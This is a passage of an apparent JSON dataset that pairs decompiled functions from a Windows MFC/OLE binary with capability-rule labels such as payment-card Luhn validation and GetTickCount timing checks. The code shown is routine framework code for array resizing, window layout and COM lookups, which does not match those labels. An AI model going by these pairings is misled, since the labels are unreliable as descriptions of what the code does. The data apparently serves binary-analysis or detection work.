(iVar6 != *(in_ECX + 8) && -1 < iVar6 - *(in_ECX + 8)) {\n                    do {\n                        piVar3 = (*(in_ECX + 8) + iVar5) * 0xc + *(in_ECX + 4);\n                        if (piVar3 != NULL) {\n                            *piVar3 = arg_8h;\n                            piVar3[1] = arg_8h;\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < iVar6 - *(in_ECX + 8));\n                }\n            }\n            else if ((iVar6 < iVar5) && (iVar5 != iVar6 && -1 < iVar5 - iVar6)) {\n                do {\n                    fcn.004492c6();\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < *(in_ECX + 8) - iVar6);\n            }\n            goto code_r0x004497de;\n        }\n        iVar5 = *(in_ECX + 0x10);\n        if (iVar5 == arg_8h) {\n            iVar5 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar5 < 4) {\n                iVar5 = 4;\n            }\n            else if (0x400 < iVar5) {\n                iVar5 = 0x400;\n            }\n        }\n        arg_8h = iVar5 + *(in_ECX + 0xc);\n        if (arg_8h <= iVar6) {\n            arg_8h = iVar6;\n        }\n    } while (arg_8h < *(in_ECX + 0xc));\n    iVar5 = fcn.004170b4(arg_8h * 0xc);\n    fcn.00417b17(iVar5, arg_8h * 0xc, *(in_ECX + 4), *(in_ECX + 8) * 0xc);\n    fcn.00459330(*(in_ECX + 8) * 0xc + iVar5, 0, (iVar6 - *(in_ECX + 8)) * 0xc);\n    iVar4 = 0;\n    if (iVar6 != *(in_ECX + 8) && -1 < iVar6 - *(in_ECX + 8)) {\n        do {\n            puVar2 = (*(in_ECX + 8) + iVar4) * 0xc + iVar5;\n            if (puVar2 != NULL) {\n                *puVar2 = 0;\n                puVar2[1] = 0;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar6 - *(in_ECX + 8));\n    }\n    fcn.004170df(*(in_ECX + 4));\n    *(in_ECX + 4) = iVar5;\ncode_r0x004497d8:\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x004497de:\n    *(in_ECX + 8) = iVar6;\n    return;\n}\n",
        "token_count": 1373
    },
    "004499b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004499b4(int32_t param_1, int32_t param_2)\n\n{\n    uint unaff_retaddr;\n    \n    if (param_2 < 0) {\n        fcn.0041901a();\n    }\n    if (*(param_1 + 8) <= param_2) {\n        fcn.004495e4(param_2 + 1, 0xffffffff);\n    }\n    fcn.0044986e(unaff_retaddr);\n    return;\n}\n",
        "token_count": 111
    },
    "004499ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004499ff(int32_t param_1, int32_t param_2, int16_t *param_3, uint *param_4)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    ulong *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    puVar3 = *(param_2 + 0x18) + param_1;\n    if (*(param_2 + 0xc) != 0xc) {\n        *param_3 = *(param_2 + 0xc);\n    }\n    // switch table (20 cases) at 0x449a9b\n    switch(*(param_2 + 0xc)) {\n    case 2:\n    case 0x12:\n        iVar2 = *puVar3;\n        goto code_r0x00449a37;\n    case 3:\n    case 10:\n    case 0x13:\n        uVar4 = *puVar3;\n        goto code_r0x00449a3f;\n    case 4:\n        *(param_3 + 4) = *puVar3;\n        break;\n    case 5:\n    case 7:\n        *(param_3 + 4) = *puVar3;\n        break;\n    case 6:\n    case 0x14:\n    case 0x15:\n        *(param_3 + 4) = *puVar3;\n        *(param_3 + 6) = *(puVar3 + 4);\n        break;\n    case 8:\n        uVar4 = fcn.0041ee6d();\ncode_r0x00449a3f:\n        *(param_3 + 4) = uVar4;\n        break;\n    case 9:\n    case 0xd:\n        piVar1 = *puVar3;\n        *(param_3 + 4) = piVar1;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 4))(piVar1);\n        }\n        break;\n    case 0xb:\n        iVar2 = -(*puVar3 != 0);\ncode_r0x00449a37:\n        param_3[4] = iVar2;\n        break;\n    case 0xc:\n        iVar5 = (*_sym.imp.OLEAUT32.dll_VariantCopyInd)(param_3, puVar3);\n        if (iVar5 == 0) {\n            return;\n        }\n    default:\n        *param_4 = 0;\n        break;\n    case 0x10:\n    case 0x11:\n        *(param_3 + 4) = *puVar3;\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "0044aa7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.0044aa7b(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    uVar1 = *(param_1 + 0x2c);\n    bVar3 = uVar1 < *(param_1 + 0x30);\n    if (bVar3) {\n        iVar2 = *(param_1 + 0x20);\n        fcn.00417b17(param_2, iVar2, iVar2 * uVar1 + *(param_1 + 0x28), iVar2);\n        *(param_1 + 0x2c) = *(param_1 + 0x2c) + 1;\n    }\n    return bVar3;\n}\n",
        "token_count": 177
    },
    "0044aeed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044aeed(char *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    \n    fcn.00418c5b(arg_8h);\n    if (*arg_8h == '{') {\n        uVar1 = (*_sym.imp.ole32.dll_CLSIDFromString)();\n    }\n    else {\n        uVar1 = (*_sym.imp.ole32.dll_CLSIDFromProgID)(arg_8h, arg_ch);\n    }\n    fcn.004010d0();\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0044b90d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b90d(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    \n    iVar1 = arg_8h;\n    iVar4 = 0;\n    if (-1 < arg_8h) goto code_r0x0044b923;\n    do {\n        fcn.0041901a();\ncode_r0x0044b923:\n        if (iVar4 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == iVar4) {\n            fcn.004170df(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar4;\n            *(in_ECX + 8) = iVar4;\n            goto code_r0x0044ba27;\n        }\n        if (*(in_ECX + 4) == iVar4) {\n            uVar2 = fcn.004170b4(iVar1 << 2);\n            *(in_ECX + 4) = uVar2;\n            fcn.00459330(uVar2, 0, iVar1 << 2);\n            *(in_ECX + 0xc) = iVar1;\ncode_r0x0044b98f:\n            *(in_ECX + 8) = iVar1;\n            return;\n        }\n        iVar4 = *(in_ECX + 0xc);\n        if (iVar1 <= iVar4) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00459330(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x0044b98f;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\ncode_r0x0044b9c1:\n                iVar3 = 4;\n            }\n            else if (iVar3 < 0x401) {\n                if (iVar3 < 4) goto code_r0x0044b9c1;\n            }\n            else {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + iVar4;\n        if (iVar3 + iVar4 <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < iVar4);\n    iVar4 = fcn.004170b4(arg_8h << 2);\n    fcn.00417b17(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00459330(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.004170df(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0044ba27:\n    *(in_ECX + 4) = iVar4;\n    return;\n}\n",
        "token_count": 780
    },
    "0044bb1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bb1c(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.0044b90d(iVar1 + arg_10h, 0xffffffff);\n            fcn.0040e880(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, ((*(in_ECX + 8) - arg_8h) - arg_10h) * 4, \n                         *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.00459330(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.0044b90d(arg_8h + arg_10h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.0041901a();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 392
    },
    "0044c014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044c014(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    (**(*in_ECX + 0x140))(&var_10h, in_ECX[0x20] & 0xa000);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 189
    },
    "0044c09e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0044c09e(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00435df3(param_1);\n    return -(0xffff < uVar1) & uVar1;\n}\n",
        "token_count": 59
    },
    "0044c0bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0044c0bd(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint noname_3, uint noname_4, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    bool bVar5;\n    bool bVar6;\n    int32_t lpRect;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = 0;\n    if (in_ECX != 0) goto code_r0x0044c0d3;\n    do {\n        iVar1 = fcn.0041901a();\ncode_r0x0044c0d3:\n    } while (arg_8h == iVar1);\n    uVar4 = *(in_ECX + 0x80) & 0xa000;\n    var_10h = iVar1;\n    var_ch = iVar1;\n    var_8h = iVar1;\n    var_4h = iVar1;\n    if (*(in_ECX + 0xa0) != iVar1 && iVar1 <= *(in_ECX + 0xa0)) {\n        do {\n            iVar1 = var_4h;\n            piVar2 = fcn.0044c09e();\n            if ((piVar2 == NULL) || (iVar3 = (**(*piVar2 + 0x154))(),  iVar3 == 0)) {\n                var_10h = var_10h + (var_8h - *0x4ad20c);\n                var_8h = 0;\n                iVar1 = arg_20h;\n                if (uVar4 == 0) {\n                    iVar1 = arg_1ch;\n                }\n                if (iVar1 < var_10h) {\n                    if (var_4h == 0) {\n                        fcn.00444df0(var_ch + 1, 0, 1);\n                    }\n                    iVar3 = var_ch + 1;\n                    goto code_r0x0044c1cf;\n                }\ncode_r0x0044c19e:\n                var_ch = var_4h;\n            }\n            else {\n                (*_sym.imp.USER32.dll_GetWindowRect)(piVar2[8], &lpRect, iVar1);\n                fcn.00419ea1(&lpRect);\n                if (uVar4 == 0) {\n                    iVar1 = (var_18h - lpRect) + -1;\n                }\n                else {\n                    iVar1 = var_14h - var_1ch;\n                }\n                if (var_8h <= iVar1) {\n                    if (uVar4 == 0) {\n                        var_8h = (var_18h - lpRect) + -1;\n                    }\n                    else {\n                        var_8h = var_14h - var_1ch;\n                    }\n                }\n                if (uVar4 == 0) {\n                    bVar6 = SBORROW4(arg_10h, var_1ch);\n                    iVar1 = arg_10h - var_1ch;\n                    bVar5 = arg_10h == var_1ch;\n                }\n                else {\n                    bVar6 = SBORROW4(arg_ch, lpRect);\n                    iVar1 = arg_ch - lpRect;\n                    bVar5 = arg_ch == lpRect;\n                }\n                if (!bVar5 && bVar6 == iVar1 < 0) goto code_r0x0044c19e;\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < *(in_ECX + 0xa0));\n        iVar1 = 0;\n    }\n    iVar3 = var_ch + 1;\n    fcn.00444df0(iVar3, iVar1, 1);\ncode_r0x0044c1cf:\n    fcn.00444df0(iVar3, arg_8h, 1);\n    return iVar3;\n}\n",
        "token_count": 949
    },
    "0044c343": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044c343(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    iVar4 = 4;\n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDockBar.0;\n    iVar3 = 0;\n    pcVar1 = extraout_ECX[0x28];\n    *(unaff_EBP + -4) = 1;\n    if (0 < pcVar1) {\n        do {\n            iVar4 = iVar3;\n            iVar2 = fcn.0044c09e();\n            if ((iVar2 != 0) && (*(iVar2 + 0x8c) == extraout_ECX)) {\n                *(iVar2 + 0x8c) = 0;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < extraout_ECX[0x28]);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.00444bd1(iVar4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00451c6c();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 328
    },
    "0044d362": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044d362(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint unaff_EDI;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    for (iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0); iVar1 != 0; iVar1 = iVar1 + -1) {\n        (**(*in_ECX + 0x110))(0x416, 0, 0);\n    }\n    fcn.00459330(&var_18h, 0, 0x14);\n    var_8h = 0xffffffff;\n    if (arg_8h == NULL) {\n        iVar1 = 0;\n        var_10h._0_1_ = 4;\n        if (0 < arg_ch) {\n            do {\n                iVar3 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar3 == 0) goto code_r0x0044d48f;\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < arg_ch);\n        }\n    }\n    else {\n        var_20h = 0;\n        var_1ch = 0;\n        if (0 < arg_ch) {\n            do {\n                var_14h = *arg_8h;\n                arg_8h = arg_8h + 1;\n                var_10h._0_1_ = 4;\n                if (var_14h == 0) {\n                    var_10h._1_1_ = 1;\n                    uVar2 = fcn.004225b8();\n                    if (((uVar2 & 0x800) == 0) && (*0x4a9b88 != 0x40047)) {\n                        var_18h = 8;\n                    }\n                    else {\n                        var_18h = 6;\n                    }\n                }\n                else {\n                    var_10h._1_1_ = 0;\n                    var_18h = var_20h;\n                    var_20h = var_20h + 1;\n                }\n                iVar1 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar1 == 0) goto code_r0x0044d48f;\n                var_1ch = var_1ch + 1;\n            } while (var_1ch < arg_ch);\n        }\n    }\n    iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0);\n    in_ECX[0x1d] = iVar1;\n    in_ECX[0x28] = 1;\ncode_r0x0044d48f:\n    fcn.004566a8(unaff_EDI);\n    return;\n}\n",
        "token_count": 743
    },
    "0044d64c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d64c(uint arg_8h, uint arg_ch, int32_t arg_10h, code *arg_14h)\n\n{\n    for (arg_10h = arg_10h + -1; -1 < arg_10h; arg_10h = arg_10h + -1) {\n        (*arg_14h)();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0044dfcf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044dfcf(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    if (arg_14h == 0) {\n        arg_14h = arg_10h;\n        var_4h = fcn.0044d580(arg_8h, arg_ch, arg_10h);\n        iVar1 = fcn.0044d580(arg_8h, arg_ch, 0);\n        if ((iVar1 != var_4h) && (0 < arg_10h)) {\n            do {\n                iVar1 = (arg_14h + iVar4) / 2;\n                iVar2 = fcn.0044d580(arg_8h, arg_ch, iVar1);\n                if ((iVar2 != var_4h) && (bVar5 = iVar4 == iVar1,  iVar4 = iVar1,  iVar1 = arg_14h,  bVar5)) {\n                    fcn.0044d580(arg_8h, arg_ch, arg_14h);\n                    break;\n                }\n                arg_14h = iVar1;\n            } while (iVar4 < arg_14h);\n        }\n        fcn.0044dea0(&var_10h, arg_8h, arg_ch);\n        iVar1 = var_10h;\ncode_r0x0044e145:\n        fcn.0044d580(arg_8h, arg_ch, iVar1);\n    }\n    else {\n        fcn.0044d580(arg_8h, arg_ch, 0);\n        piVar3 = fcn.0044dea0(&var_10h, arg_8h, arg_ch);\n        iVar4 = *piVar3;\n        var_4h = piVar3[1];\n        var_8h = iVar4;\n        fcn.0044d580(arg_8h, arg_ch, 0x7fff);\n        piVar3 = fcn.0044dea0(&var_18h, arg_8h, arg_ch);\n        iVar1 = *piVar3;\n        var_ch = piVar3[1];\n        var_10h = iVar1;\n        if (iVar4 < iVar1) {\n            do {\n                fcn.0044d580(arg_8h, arg_ch, (iVar1 + iVar4) / 2);\n                piVar3 = fcn.0044dea0(&var_18h, arg_8h, arg_ch);\n                iVar4 = piVar3[1];\n                if (arg_10h < iVar4) {\n                    iVar4 = fcn.0044d787(*piVar3, iVar4);\n                    if (iVar4 != 0) goto code_r0x0044e145;\n                    var_8h = *piVar3;\n                    var_4h = piVar3[1];\n                }\n                else {\n                    if (arg_10h <= iVar4) {\n                        return;\n                    }\n                    iVar4 = fcn.0044d787(*piVar3, iVar4);\n                    iVar1 = var_8h;\n                    if (iVar4 != 0) goto code_r0x0044e145;\n                    iVar1 = *piVar3;\n                    var_ch = piVar3[1];\n                    var_10h = iVar1;\n                }\n                iVar4 = var_8h;\n            } while (var_8h < iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 850
    },
    "0044e2ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e2ca(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.00451b60(&var_10h, (*(in_ECX + 0x80) & 0xa000) != 0);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    if (*0x4a9b88 < 0x40047) {\n        arg_ch[1] = arg_ch[1] + -2;\n    }\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 227
    },
    "0044f0d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f0d2(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t lpRect;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.0041901a();\n    }\n    arg_ch[1] = arg_ch[1] | 0x70;\n    *arg_ch = 0x50;\n    arg_ch[8] = *(arg_8h + 0x20);\n    piVar1 = fcn.004306fe(0x48fc28, arg_8h);\n    if (piVar1 == NULL) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(arg_8h + 0x20), &lpRect);\n        var_8h = var_8h - lpRect;\n        var_4h = var_4h - var_ch;\n    }\n    else {\n        piVar1 = (**(*piVar1 + 0x134))(&var_8h, 0, in_ECX[0x20] & 0xa000);\n        var_8h = *piVar1;\n        var_4h = piVar1[1];\n    }\n    arg_ch[10] = var_4h;\n    if (*0x4a9b88 < 0x40048) {\n        iVar2 = 4;\n    }\n    else {\n        iVar2 = 0;\n    }\n    iVar2 = iVar2 + var_8h;\n    arg_ch[0x11] = iVar2;\n    arg_ch[0xb] = iVar2;\n    if ((arg_ch[2] & 0x200) == 0) {\n        arg_ch[9] = iVar2;\n    }\n    else {\n        arg_ch[1] = arg_ch[1] | 0x200;\n        arg_ch[9] = var_4h;\n    }\n    iVar2 = (**(*in_ECX + 0x110))(0x401, 0xffffffff, arg_ch);\n    if (iVar2 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        piVar1 = fcn.0041f1fc();\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x148))(1);\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], 0x41f, 0, 0);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 605
    },
    "0044f478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f478(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.00451b60(&var_10h, (*(in_ECX + 0x80) & 0xa000) != 0);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 190
    },
    "0044f726": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044f726(int32_t *param_1, int32_t *param_2, int32_t **param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t **in_FS_OFFSET;\n    uchar *arg_8h;\n    uchar *puVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t *piStack284;\n    int32_t *arg_8h_00;\n    uint uStack268;\n    uint32_t uStack8;\n    \n    arg_8h = &stack0xfffffef4;\n    uStack8 = *0x4a9ec8 ^ arg_8h;\n    uStack268 = 0x18;\n    fcn.00458e45();\n    fcn.004320fb();\n    piVar1 = (**(*extraout_ECX + 0x20))();\n    piStack284 = param_1;\n    arg_8h_00 = param_2;\n    iVar2 = fcn.0044f6d8();\n    if (iVar2 == 0) {\n        piVar6 = &stack0xfffffee4;\n        piVar1 = param_1;\n        iVar2 = fcn.0044f53c(param_1, piVar6);\n        if (iVar2 == 0) {\n            iVar2 = (**(*extraout_ECX + 0x24))(param_1, &stack0xfffffee4);\n            if (iVar2 < 0) {\n                fcn.0042b84e(extraout_ECX[7]);\n                iVar2 = fcn.0042b7b9();\n                iVar2 = *(iVar2 + 8);\n                uVar5 = 0x104;\n                puVar4 = arg_8h;\n                (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar2, arg_8h, 0x104);\n                fcn.00418c5b(arg_8h);\n                iVar3 = (*_sym.imp.OLEAUT32.dll_LoadRegTypeLib)(puVar4, &stack0xfffffee4);\n                if (iVar3 < 0) {\n                    piStack284 = NULL;\n                }\n                fcn.004010d0();\n                if (iVar2 != 0) {\n                    piStack284 = NULL;\n                    fcn.0042abcb(uVar5, arg_8h);\n                }\n            }\n            piVar1 = param_1;\n            piVar6 = piStack284;\n            fcn.0044f56d(param_1, piStack284);\n        }\n        if (piStack284 != NULL) {\n            (**(*piStack284 + 0x18))(piStack284, param_2, param_3);\n            (**(*piStack284 + 8))(piStack284);\n            piStack284 = *param_3;\n            fcn.0044f5b0(param_1, param_2);\n            piVar1 = param_1;\n            piVar6 = param_2;\n        }\n    }\n    else {\n        piVar6 = NULL;\n    }\n    fcn.00432168(0xd, piVar1, piVar6);\n    *in_FS_OFFSET = arg_8h_00;\n    piStack284 = 0x44f886;\n    fcn.004566a8(arg_8h_00);\n    return;\n}\n",
        "token_count": 759
    },
    "0044f890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044f890(code *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint unaff_retaddr;\n    \n    *(param_2 + param_3) = unaff_retaddr;\n    *((param_2 + param_3) - param_3) = 0x44f8a0;\n    (*param_1)();\n    return;\n}\n",
        "token_count": 89
    },
    "00450159": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00450159(void)\n\n{\n    code **extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffdfc;\n    \n    fcn.00458e78();\n    *extraout_ECX = vtable.COleObjectFactory.0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.0044fb39();\n        fcn.0042b7b9();\n        fcn.004320fb(0);\n        fcn.004310f1(extraout_ECX);\n        uStackY532 = 0;\n        fcn.00432168();\n    }\n    fcn.004220a2();\n    *in_FS_OFFSET = uStackY532;\n    fcn.004566a8(in_stack_fffffdfc);\n    return;\n}\n",
        "token_count": 183
    },
    "00450428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450428(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 0x20) != 0) {\n        uVar1 = 0;\n        if (*(param_1 + 0x28) != 0) {\n            iVar2 = 0;\n            do {\n                (*_sym.imp.ole32.dll_CoTaskMemFree)(*(iVar2 + 4 + *(param_1 + 0x20)));\n                (*_sym.imp.ole32.dll_ReleaseStgMedium)(iVar2 + 0x14 + *(param_1 + 0x20));\n                uVar1 = uVar1 + 1;\n                iVar2 = iVar2 + 0x24;\n            } while (uVar1 < *(param_1 + 0x28));\n        }\n        fcn.004170df(*(param_1 + 0x20));\n        *(param_1 + 0x20) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "004506a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
